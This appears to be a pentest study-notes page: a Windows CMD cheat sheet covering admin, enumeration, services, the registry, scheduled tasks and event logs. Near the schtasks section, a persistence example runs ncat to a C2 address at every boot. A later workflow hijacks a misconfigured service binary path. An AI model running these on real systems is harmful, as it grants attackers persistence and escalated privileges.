+<h4 id="variable-scopes">Variable Scopes<a class="headerlink" href="#variable-scopes" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Scope</th>
+<th>Accessible By</th>
+<th>Registry Location</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>System</td>
+<td>All users and processes; requires Local/Domain Admin to modify</td>
+<td><code>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment</code></td>
+</tr>
+<tr>
+<td>User</td>
+<td>Current user only</td>
+<td><code>HKCU\Environment</code></td>
+</tr>
+<tr>
+<td>Process</td>
+<td>Current process only; volatile — lost when process ends</td>
+<td>In memory only; inherits from System and User scopes</td>
+</tr>
+</tbody>
+</table>
+<h4 id="managing-environment-variables">Managing Environment Variables<a class="headerlink" href="#managing-environment-variables" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>set</code></td>
+<td>Display all currently defined environment variables</td>
+</tr>
+<tr>
+<td><code>set %NAME%</code></td>
+<td>Show the value of a specific variable</td>
+</tr>
+<tr>
+<td><code>set NAME=Value</code></td>
+<td>Create or update a variable for the current CMD session only</td>
+</tr>
+<tr>
+<td><code>setx NAME Value</code></td>
+<td>Create or update a variable persistently (writes to registry; takes effect in new sessions)</td>
+</tr>
+<tr>
+<td><code>setx NAME ""</code></td>
+<td>Delete a variable by setting its value to empty</td>
+</tr>
+</tbody>
+</table>
+<p><code>setx</code> can also target remote machines across a domain — useful for managing environment variables at scale.</p>
+<h4 id="common-built-in-variables">Common Built-in Variables<a class="headerlink" href="#common-built-in-variables" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Variable</th>
+<th>Expands To</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>%PATH%</code></td>
+<td>Directories searched when running an executable</td>
+</tr>
+<tr>
+<td><code>%OS%</code></td>
+<td>Current OS name (e.g., <code>Windows_NT</code>)</td>
+</tr>
+<tr>
+<td><code>%SYSTEMROOT%</code></td>
+<td><code>C:\Windows</code> — Windows system directory</td>
+</tr>
+<tr>
+<td><code>%LOGONSERVER%</code></td>
+<td>Hostname of the authentication server for the current user</td>
+</tr>
+<tr>
+<td><code>%USERPROFILE%</code></td>
+<td>Current user's home directory (<code>C:\Users\&lt;username&gt;</code>)</td>
+</tr>
+<tr>
+<td><code>%ProgramFiles%</code></td>
+<td><code>C:\Program Files</code> — 64-bit application install directory</td>
+</tr>
+<tr>
+<td><code>%ProgramFiles(x86)%</code></td>
+<td><code>C:\Program Files (x86)</code> — 32-bit applications under WOW64</td>
+</tr>
+<tr>
+<td><code>%APPDATA%</code></td>
+<td>User application data (<code>C:\Users\&lt;user&gt;\AppData\Roaming</code>)</td>
+</tr>
+<tr>
+<td><code>%TEMP%</code></td>
+<td>Current user's temporary files directory</td>
+</tr>
+</tbody>
+</table>
+<p>Full variable reference: <a href="https://ss64.com/nt/syntax-variables.html">https://ss64.com/nt/syntax-variables.html</a></p>
+<hr />
+<h3 id="network-diagnostics">Network Diagnostics<a class="headerlink" href="#network-diagnostics" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ipconfig</code></td>
+<td>Displays basic IP configuration</td>
+</tr>
+<tr>
+<td><code>ipconfig /all</code></td>
+<td>Full details including DNS, MAC address, and gateway</td>
+</tr>
+<tr>
+<td><code>ping &lt;host&gt;</code></td>
+<td>Tests connectivity to a host</td>
+</tr>
+<tr>
+<td><code>tracert &lt;host&gt;</code></td>
+<td>Shows route packets take to reach a host</td>
+</tr>
+<tr>
+<td><code>nslookup &lt;domain&gt;</code></td>
+<td>Queries DNS for a domain — see <a href="nslookup.md">nslookup</a></td>
+</tr>
+<tr>
+<td><code>netstat</code></td>
+<td>Displays active connections and listening ports</td>
+</tr>
+<tr>
+<td><code>netstat -a</code></td>
+<td>All connections and listening ports</td>
+</tr>
+<tr>
+<td><code>netstat -b</code></td>
+<td>Shows executable associated with each connection</td>
+</tr>
+<tr>
+<td><code>netstat -o</code></td>
+<td>Shows PID associated with each connection</td>
+</tr>
+<tr>
+<td><code>netstat -n</code></td>
+<td>Displays addresses and ports numerically</td>
+</tr>
+<tr>
+<td><code>netstat -ano</code></td>
+<td>All connections with PIDs in numeric format — correlate to processes</td>
+</tr>
+<tr>
+<td><code>arp -a</code></td>
+<td>Displays ARP cache; reveals hosts on the local network segment</td>
+</tr>
+<tr>
+<td><code>route print</code></td>
+<td>Shows full routing table including default gateway</td>
+</tr>
+</tbody>
+</table>
+<h3 id="user-privilege-enumeration">User &amp; Privilege Enumeration<a class="headerlink" href="#user-privilege-enumeration" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>whoami</code></td>
+<td>Current logged-on user</td>
+</tr>
+<tr>
+<td><code>whoami /priv</code></td>
+<td>List privileges assigned to current token; key for privilege escalation</td>
+</tr>
+<tr>
+<td><code>whoami /groups</code></td>
+<td>List all group memberships of current user</td>
+</tr>
+<tr>
+<td><code>whoami /all</code></td>
+<td>Full token dump — user, groups, and privileges combined</td>
+</tr>
+<tr>
+<td><code>net user</code></td>
+<td>List all local user accounts</td>
+</tr>
+<tr>
+<td><code>net user &lt;username&gt;</code></td>
+<td>Detailed info on a specific user — last logon, group memberships, password policy</td>
+</tr>
+<tr>
+<td><code>net localgroup</code></td>
+<td>List all local groups</td>
+</tr>
+<tr>
+<td><code>net localgroup administrators</code></td>
+<td>List members of the local administrators group</td>
+</tr>
+<tr>
+<td><code>net localgroup "&lt;group&gt;" &lt;user&gt; /add</code></td>
+<td>Add a user to a local group</td>
+</tr>
+</tbody>
+</table>
+<h3 id="share-network-resource-management">Share &amp; Network Resource Management<a class="headerlink" href="#share-network-resource-management" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>net share</code></td>
+<td>List all active network shares on the system</td>
+</tr>
+<tr>
+<td><code>net use</code></td>
+<td>View or connect to network shares</td>
+</tr>
+<tr>
+<td><code>net use Z: \\&lt;host&gt;\&lt;share&gt;</code></td>
+<td>Map a network share to a drive letter</td>
+</tr>
+<tr>
+<td><code>net view \\&lt;host&gt;</code></td>
+<td>List shares on a remote host</td>
+</tr>
+</tbody>
+</table>
+<h3 id="file-permissions-icacls">File Permissions — icacls<a class="headerlink" href="#file-permissions-icacls" title="Permanent link">&para;</a></h3>
+<p><code>icacls</code> views and modifies NTFS permissions on files and folders.</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>icacls &lt;path&gt;</code></td>
+<td>View permissions on a file or directory</td>
+</tr>
+<tr>
+<td><code>icacls &lt;path&gt; /grant &lt;user&gt;:(F)</code></td>
+<td>Grant Full Control to a user</td>
+</tr>
+<tr>
+<td><code>icacls &lt;path&gt; /grant &lt;user&gt;:(OI)(CI)(F)</code></td>
+<td>Grant Full Control including all subdirectories and files</td>
+</tr>
+<tr>
+<td><code>icacls &lt;path&gt; /remove &lt;user&gt;</code></td>
+<td>Remove all permissions for a user</td>
+</tr>
+<tr>
+<td><code>icacls &lt;path&gt; /reset</code></td>
+<td>Reset permissions to inherited defaults</td>
+</tr>
+</tbody>
+</table>
+<h4 id="inheritance-flags">Inheritance Flags<a class="headerlink" href="#inheritance-flags" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>(OI)</code></td>
+<td>Object Inherit — applies to files in this folder</td>
+</tr>
+<tr>
+<td><code>(CI)</code></td>
+<td>Container Inherit — applies to subfolders</td>
+</tr>
+<tr>
+<td><code>(IO)</code></td>
+<td>Inherit Only — does not apply to the folder itself</td>
+</tr>
+<tr>
+<td><code>(NP)</code></td>
+<td>No Propagate Inherit</td>
+</tr>
+<tr>
+<td><code>(I)</code></td>
+<td>Permission inherited from parent</td>
+</tr>
+</tbody>
+</table>
+<p>Reference: <code>icacls /?</code> or <a href="https://ss64.com/nt/icacls.html">https://ss64.com/nt/icacls.html</a></p>
+<h3 id="process-service-overview">Process &amp; Service Overview<a class="headerlink" href="#process-service-overview" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>tasklist</code></td>
+<td>List all running processes with name and PID</td>
+</tr>
+<tr>
+<td><code>tasklist /svc</code></td>
+<td>Show which services are running under each process</td>
+</tr>
+<tr>
+<td><code>tasklist /FI "imagename eq sshd.exe"</code></td>
+<td>Filter running processes by image name</td>
+</tr>
+<tr>
+<td><code>tasklist /m /FI "PID eq 1304"</code></td>
+<td>Show all DLLs loaded by a specific process (useful for DLL hijacking checks)</td>
+</tr>
+<tr>
+<td><code>taskkill /PID &lt;target&gt;</code></td>
+<td>Kill a process by its PID</td>
+</tr>
+<tr>
+<td><code>net start</code></td>
+<td>List all running services</td>
+</tr>
+<tr>
+<td><code>net start &lt;service&gt;</code></td>
+<td>Start a named service</td>
+</tr>
+<tr>
+<td><code>net stop &lt;service&gt;</code></td>
+<td>Stop a named service</td>
+</tr>
+<tr>
+<td><code>net pause &lt;service&gt;</code></td>
+<td>Pause a service</td>
+</tr>
+<tr>
+<td><code>net continue &lt;service&gt;</code></td>
+<td>Resume a paused service</td>
+</tr>
+</tbody>
+</table>
+<h3 id="service-management-sc">Service Management — sc<a class="headerlink" href="#service-management-sc" title="Permanent link">&para;</a></h3>
+<p><code>sc</code> (Service Control) queries and modifies Windows services.</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sc query</code></td>
+<td>List all running services</td>
+</tr>
+<tr>
+<td><code>sc query type= all</code></td>
+<td>List all services (including stopped)</td>
+</tr>
+<tr>
+<td><code>sc qc &lt;service&gt;</code></td>
+<td>Query full configuration of a service (binary path, start type, account)</td>
+</tr>
+<tr>
+<td><code>sc \\&lt;host&gt; query &lt;service&gt;</code></td>
+<td>Query a service on a remote host</td>
+</tr>
+<tr>
+<td><code>sc start &lt;service&gt;</code></td>
+<td>Start a service</td>
+</tr>
+<tr>
+<td><code>sc stop &lt;service&gt;</code></td>
+<td>Stop a service</td>
+</tr>
+<tr>
+<td><code>sc config &lt;service&gt; binPath= "&lt;path&gt;"</code></td>
+<td>Change the binary path of a service</td>
+</tr>
+<tr>
+<td><code>sc sdshow &lt;service&gt;</code></td>
+<td>Show the service security descriptor in SDDL format</td>
+</tr>
+</tbody>
+</table>
+<p>Reading SDDL output from <code>sc sdshow</code>:
+- <code>D:</code> — DACL entries follow
+- <code>(A;;CCLCSWRPLORC;;;AU)</code> — <code>A</code> = allow; <code>AU</code> = Authenticated Users; codes are permission flags
+- Common DACL flags: <code>CC</code> = query config, <code>LC</code> = query status, <code>SW</code> = enumerate dependents, <code>RP</code> = start service, <code>LO</code> = interrogate, <code>RC</code> = read control</p>
+<h3 id="registry-reg">Registry — reg<a class="headerlink" href="#registry-reg" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>reg query &lt;key&gt;</code></td>
+<td>List values and subkeys at a registry path</td>
+</tr>
+<tr>
+<td><code>reg query &lt;key&gt; /v &lt;value&gt;</code></td>
+<td>Query a specific value</td>
+</tr>
+<tr>
+<td><code>reg query &lt;key&gt; /s</code></td>
+<td>Recursively query all subkeys</td>
+</tr>
+<tr>
+<td><code>reg add &lt;key&gt; /v &lt;value&gt; /t REG_SZ /d &lt;data&gt;</code></td>
+<td>Add or modify a registry value</td>
+</tr>
+<tr>
+<td><code>reg delete &lt;key&gt; /v &lt;value&gt;</code></td>
+<td>Delete a specific registry value</td>
+</tr>
+<tr>
+<td><code>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code></td>
+<td>View programs set to run at startup (HKLM)</td>
+</tr>
+<tr>
+<td><code>reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code></td>
+<td>View programs set to run at startup (HKCU)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="scheduled-tasks-schtasks">Scheduled Tasks — schtasks<a class="headerlink" href="#scheduled-tasks-schtasks" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>schtasks /query /fo LIST /v</code></td>
+<td>List all scheduled tasks with full verbose detail</td>
+</tr>
+<tr>
+<td><code>schtasks /query /fo TABLE</code></td>
+<td>List tasks in compact table format</td>
+</tr>
+<tr>
+<td><code>schtasks /create /sc onlogon /tn "&lt;name&gt;" /tr "&lt;command&gt;"</code></td>
+<td>Create a task that runs at logon</td>
+</tr>
+<tr>
+<td><code>schtasks /create /sc minute /mo 1 /tn "&lt;name&gt;" /tr "&lt;command&gt;"</code></td>
+<td>Create a task that runs every minute</td>
+</tr>
+<tr>
+<td><code>schtasks /delete /tn "&lt;name&gt;" /f</code></td>
+<td>Delete a scheduled task</td>
+</tr>
+<tr>
+<td><code>schtasks /run /tn "&lt;name&gt;"</code></td>
+<td>Manually trigger a scheduled task immediately</td>
+</tr>
+<tr>
+<td><code>schtasks /change /tn "&lt;name&gt;" /tr "&lt;newcmd&gt;"</code></td>
+<td>Change the command a task runs</td>
+</tr>
+<tr>
+<td><code>schtasks /change /tn "&lt;name&gt;" /ru &lt;user&gt; /rp &lt;password&gt;</code></td>
+<td>Change the user credentials a task runs under</td>
+</tr>
+<tr>
+<td><code>schtasks /change /tn "&lt;name&gt;" /ENABLE</code></td>
+<td>Enable a disabled task</td>
+</tr>
+<tr>
+<td><code>schtasks /change /tn "&lt;name&gt;" /DISABLE</code></td>
+<td>Disable an active task</td>
+</tr>
+</tbody>
+</table>
+<p>Additional create flags:
+| Flag | Description |
+|------|-------------|
+| <code>/rl LIMITED</code> | Run with limited (standard user) privileges — default |
+| <code>/rl HIGHEST</code> | Run with highest available privileges |
+| <code>/z</code> | Delete the task automatically after it completes once |
+| <code>/mo &lt;n&gt;</code> | Modifier for schedule frequency (e.g., every n minutes) |
+| <code>/s &lt;host&gt;</code> | Target a remote host; requires <code>/u</code> and <code>/p</code> for credentials |</p>
+<p>Persistence example — create a task that phones home to a C2 on every reboot:
+<code>schtasks /create /sc ONSTART /tn "UpdateTask" /tr "C:\Users\user\AppData\Local\ncat.exe 10.10.10.1 4444"</code></p>
+<h3 id="wmi-wmic">WMI — wmic<a class="headerlink" href="#wmi-wmic" title="Permanent link">&para;</a></h3>
+<p><code>wmic</code> provides a command-line interface to Windows Management Instrumentation.</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>wmic os list brief</code></td>
+<td>OS version, build, and system name</td>
+</tr>
+<tr>
+<td><code>wmic computersystem get name,username</code></td>
+<td>Hostname and currently logged-on user</td>
+</tr>
+<tr>
+<td><code>wmic useraccount get name,sid</code></td>
+<td>List all local user accounts with their SIDs</td>
+</tr>
+<tr>
+<td><code>wmic service list brief</code></td>
+<td>All services with name, PID, state, and start mode</td>
+</tr>
+<tr>
+<td><code>wmic process list brief</code></td>
+<td>All running processes (name, PID, parent PID, handles)</td>
+</tr>
+<tr>
+<td><code>wmic process where name="&lt;proc&gt;.exe" delete</code></td>
+<td>Kill a process by name</td>
+</tr>
+<tr>
+<td><code>wmic startup list brief</code></td>
+<td>Programs configured to run at startup</td>
+</tr>
+<tr>
+<td><code>wmic product get name,version</code></td>
+<td>List all installed software</td>
+</tr>
+<tr>
+<td><code>wmic bios get serialnumber,version</code></td>
+<td>BIOS serial number and version</td>
+</tr>
+<tr>
+<td><code>wmic logicaldisk get name,size,freespace</code></td>
+<td>Drive space on all logical disks</td>
+</tr>
+<tr>
+<td><code>wmic nic get name,macaddress</code></td>
+<td>Network adapters and MAC addresses</td>
+</tr>
+</tbody>
+</table>
+<h3 id="windows-event-log">Windows Event Log<a class="headerlink" href="#windows-event-log" title="Permanent link">&para;</a></h3>
+<p>Windows logs system activity into structured event records. SOC analysts use these to detect attacks; pentesters review them to find information and cover tracks.</p>
+<h4 id="log-categories">Log Categories<a class="headerlink" href="#log-categories" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Log</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>System</td>
+<td>Events from Windows OS components (driver failures, service crashes)</td>
+</tr>
+<tr>
+<td>Security</td>
+<td>Login successes/failures, file access, audit events</td>
+</tr>
+<tr>
+<td>Application</td>
+<td>Events from installed software</td>
+</tr>
+<tr>
+<td>Setup</td>
+<td>Events generated during Windows installation; AD events on domain controllers</td>
+</tr>
+<tr>
+<td>Forwarded Events</td>
+<td>Logs collected and forwarded from other hosts</td>
+</tr>
+</tbody>
+</table>
+<h4 id="event-types">Event Types<a class="headerlink" href="#event-types" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Error</td>
+<td>Major problem (e.g., a service failed to load)</td>
+</tr>
+<tr>
+<td>Warning</td>
+<td>Potential issue that may need attention (e.g., low disk space)</td>
+</tr>
+<tr>
+<td>Information</td>
+<td>Normal successful operation</td>
+</tr>
+<tr>
+<td>Success Audit</td>
+<td>A security-audited action succeeded</td>
+</tr>
+<tr>
+<td>Failure Audit</td>
+<td>A security-audited action was denied</td>
+</tr>
+</tbody>
+</table>
+<h4 id="severity-levels">Severity Levels<a class="headerlink" href="#severity-levels" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Level</th>
+<th>Value</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Verbose</td>
+<td>5</td>
+<td>Progress or success messages</td>
+</tr>
+<tr>
+<td>Information</td>
+<td>4</td>
+<td>Normal operational event</td>
+</tr>
+<tr>
+<td>Warning</td>
+<td>3</td>
+<td>Potential problem worth investigating</td>
+</tr>
+<tr>
+<td>Error</td>
+<td>2</td>
+<td>Non-critical issue related to a service or component</td>
+</tr>
+<tr>
+<td>Critical</td>
+<td>1</td>
+<td>Significant failure requiring immediate attention</td>
+</tr>
+</tbody>
+</table>
+<p>Default log storage: <code>C:\Windows\System32\winevt\logs</code></p>
+<h4 id="wevtutil-command-line-event-log-tool">wevtutil — Command-Line Event Log Tool<a class="headerlink" href="#wevtutil-command-line-event-log-tool" title="Permanent link">&para;</a></h4>
+<p><code>wevtutil</code> queries, exports, and manages Windows event logs from CMD.</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>wevtutil el</code></td>
+<td>List all available log names on the system</td>
+</tr>
+<tr>
+<td><code>wevtutil gl "Windows PowerShell"</code></td>
+<td>Get configuration details for a specific log (max size, retention)</td>
+</tr>
+<tr>
+<td><code>wevtutil gli "Windows PowerShell"</code></td>
+<td>Get current log status (number of events, last write time)</td>
+</tr>
+<tr>
+<td><code>wevtutil qe Security /c:5 /rd:true /f:text</code></td>
+<td>Query the 5 most recent Security log events in readable text format</td>
+</tr>
+<tr>
+<td><code>wevtutil epl System C:\system_export.evtx</code></td>
+<td>Export all events from the System log to a file; requires local admin</td>
+</tr>
+</tbody>
+</table>
+<p>Filter by event ID for targeted investigation — see <a href="Log Fundamentals.md">Log Fundamentals</a> for key event IDs to monitor.</p>
+<p>References: <a href="https://www.thewindowsclub.com/what-is-wevtutil-and-how-do-you-use-it">https://www.thewindowsclub.com/what-is-wevtutil-and-how-do-you-use-it</a></p>
+<hr />
+<h3 id="gui-access">GUI Access<a class="headerlink" href="#gui-access" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>control /name Microsoft.WindowsUpdate</code></td>
+<td>Opens Windows Update panel</td>
+</tr>
+</tbody>
+</table>
+<h3 id="quick-reference-workflows">Quick Reference Workflows<a class="headerlink" href="#quick-reference-workflows" title="Permanent link">&para;</a></h3>
+<h4 id="system-recon">System Recon<a class="headerlink" href="#system-recon" title="Permanent link">&para;</a></h4>
+<p><code>systeminfo</code> — grab OS version, hostname, patch level, and hardware info in one command</p>
+<h4 id="network-troubleshooting">Network Troubleshooting<a class="headerlink" href="#network-troubleshooting" title="Permanent link">&para;</a></h4>
+<p><code>ipconfig /all</code> → verify IP, DNS, gateway
+<code>ping &lt;host&gt;</code> → test basic connectivity
+<code>tracert &lt;host&gt;</code> → identify where packets are being dropped</p>
+<h4 id="process-investigation">Process Investigation<a class="headerlink" href="#process-investigation" title="Permanent link">&para;</a></h4>
+<p><code>tasklist /FI "imagename eq &lt;process&gt;"</code> → find a specific process
+<code>netstat -ano</code> → correlate open connections with PIDs
+<code>tasklist /m /FI "PID eq &lt;PID&gt;"</code> → see what DLLs a suspicious process has loaded</p>
+<h4 id="privilege-escalation-recon">Privilege Escalation Recon<a class="headerlink" href="#privilege-escalation-recon" title="Permanent link">&para;</a></h4>
+<p><code>whoami /all</code> → dump current user token (user, groups, privileges)
+<code>net localgroup administrators</code> → who has local admin?
+<code>wmic service list brief</code> → any misconfigured services?
+<code>schtasks /query /fo LIST /v</code> → any writable scheduled task paths?
+<code>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code> → startup persistence</p>
+<h4 id="service-abuse-misconfigured-binary-path">Service Abuse (Misconfigured Binary Path)<a class="headerlink" href="#service-abuse-misconfigured-binary-path" title="Permanent link">&para;</a></h4>
+<p><code>sc qc &lt;service&gt;</code> → find binary path and start type
+<code>icacls "&lt;binary path&gt;"</code> → check if your user can write to the binary
+<code>sc config &lt;service&gt; binPath= "&lt;malicious path&gt;"</code> → replace binary (if writable)
+<code>sc stop &lt;service&gt; &amp;&amp; sc start &lt;service&gt;</code> → restart to trigger execution</p>
+<hr />
+<h2 id="related-concepts">Related Concepts<a class="headerlink" href="#related-concepts" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="../Windows%20Fundamentals/">Windows Fundamentals</a></li>
+<li><a href="../Windows%20PowerShell/">Windows PowerShell</a></li>
+<li><a href="../Windows%20Event%20Logs/">Windows Event Logs</a></li>
+<li><a href="Active Directory Basics.md">Active Directory Basics</a></li>
+<li><a href="Log Fundamentals.md">Log Fundamentals</a></li>
+</ul>
+<h2 id="related-techniques">Related Techniques<a class="headerlink" href="#related-techniques" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="Windows Pentest Playbook.md">Windows Pentest Playbook</a></li>
+</ul>
+<h2 id="related-tools">Related Tools<a class="headerlink" href="#related-tools" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="nslookup.md">nslookup</a></li>
+</ul>
+<hr />
+<h2 id="references-images">References / Images<a class="headerlink" href="#references-images" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://ss64.com/nt/">https://ss64.com/nt/</a> — CMD, PowerShell, and Bash command reference</li>
+<li><a href="https://ss64.com/nt/icacls.html">https://ss64.com/nt/icacls.html</a></li>
+<li><a href="https://ss64.com/nt/syntax-variables.html">https://ss64.com/nt/syntax-variables.html</a> — Full list of Windows environment variables</li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic">https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic</a></li>
+<li><a href="https://www.thewindowsclub.com/what-is-wevtutil-and-how-do-you-use-it">https://www.thewindowsclub.com/what-is-wevtutil-and-how-do-you-use-it</a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor</a> — Recommended event IDs to monitor</li>
+<li><a href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/">https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/</a> — Full Windows event ID encyclopedia</li>
+</ul>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../../..", "features": ["navigation.tabs", "navigation.sections", "navigation.indexes", "navigation.top", "search.suggest", "search.highlight", "content.tabs.link", "content.code.annotation", "content.code.copy"], "search": "../../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
